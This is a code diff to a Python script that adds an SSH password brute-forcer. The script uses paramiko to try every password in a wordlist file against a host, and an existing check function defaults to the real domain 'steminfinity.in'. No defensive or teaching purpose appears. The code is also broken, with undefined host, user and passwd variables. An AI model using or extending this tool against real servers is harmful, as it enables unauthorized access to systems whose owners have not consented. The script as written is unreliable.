@@ -1,4 +1,5 @@
 import socket
+import paramiko
 import argparse
 
 
@@ -29,8 +30,27 @@ def check_ssh(ip="steminfinity.in", port=22, timeout=3):
 
 
 def words(passwd):
-    with open(passwd , 'r' , encoding='utf-8') as f
+    with open(passwd , 'r' , encoding='utf-8') as f:
+        return[line.strip('\n') for line in f]
+    
 
+passwords = words(passwd)
+
+
+
+client = paramiko.SSHClient()
+client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+
+for password in passwords:
+
+    try:
+        client.connect(hostname=host,username=user, password=password, timeout=3)
+        print(f"connection Success🏀🏀🏀🥎🥎⚾⚾⚽⚽💎💎💍💍💍 with {host}")
+
+
+    except Exception as e:
+        print(f"Connection Failed with {host}")
 
 
 check_ssh()
